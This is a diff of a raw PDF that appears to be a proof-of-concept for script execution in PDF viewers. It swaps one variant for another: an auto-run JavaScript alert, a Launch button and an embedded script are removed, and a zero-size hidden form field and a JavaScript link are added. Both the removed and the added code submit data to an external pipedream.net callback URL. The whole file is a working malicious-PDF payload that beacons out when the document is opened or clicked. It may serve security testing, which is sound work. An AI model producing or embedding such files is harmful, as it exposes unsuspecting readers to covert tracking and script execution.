@@ -1,12 +1,12 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('PoC 1: XSS Alert!', 3);) >> >>
+<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [10 0 R] >> >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R 11 0 R] >>
 endobj
 4 0 obj
 << /Length 65 >>
@@ -14,9 +14,9 @@ stream
 BT
 /F1 12 Tf
 100 700 Td
-(PoC 1: Click the button to launch JS) Tj
+(PoC 2: Click the link to test XSS) Tj
 100 650 Td
-(Button should be below) Tj
+(Link should be below) Tj
 ET
 endstream
 endobj
@@ -30,21 +30,13 @@ endobj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 10 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Btn /T (LaunchButton) /Rect [100 600 200 630] /A << /S /Launch /F (13 0 R) /NewWindow true >> /AP << /N << /Type /XObject /Subtype /Form /BBox [0 0 100 30] /Resources << /Font << /F1 6 0 R >> >> /Length 50 >> stream BT /F1 12 Tf 10 15 Td (Click Me) Tj ET endstream >> >> >>
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (HiddenField) /V () /Rect [0 0 0 0] /A << /S /SubmitForm /F (https://eoy4evvlsf7y0jq.m.pipedream.net?poc2_hidden=1) /Flags 4 >> >>
 endobj
-13 0 obj
-<< /Type /Filespec /F (script.js) /EF << /F 14 0 R >> >>
-endobj
-14 0 obj
-<< /Type /EmbeddedFile /Length 92 >>
-stream
-var u = 'https://eoy4evvlsf7y0jq.m.pipedream.net?poc1=1';
-app.alert('PoC 1: Executing embedded JS!', 3);
-this.submitForm({ cURL: u, cSubmitAs: 'HTML' });
-endstream
+11 0 obj
+<< /Type /Annot /Subtype /Link /Rect [100 600 200 630] /BS << /W 1 /S /S >> /H /I /A << /S /JavaScript /JS (app.alert('PoC 2: XSS via Link!', 3); this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc2_link=1');) >> >>
 endobj
 xref
-0 15
+0 12
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
@@ -56,12 +48,9 @@ xref
 0000000000 65535 f 
 0000000000 65535 f 
 0000000551 00000 n 
-0000000000 65535 f 
-0000000000 65535 f 
 0000000713 00000 n 
-0000000788 00000 n 
 trailer
-<< /Size 15 /Root 1 0 R >>
+<< /Size 12 /Root 1 0 R >>
 startxref
-900
+850
 %%EOF
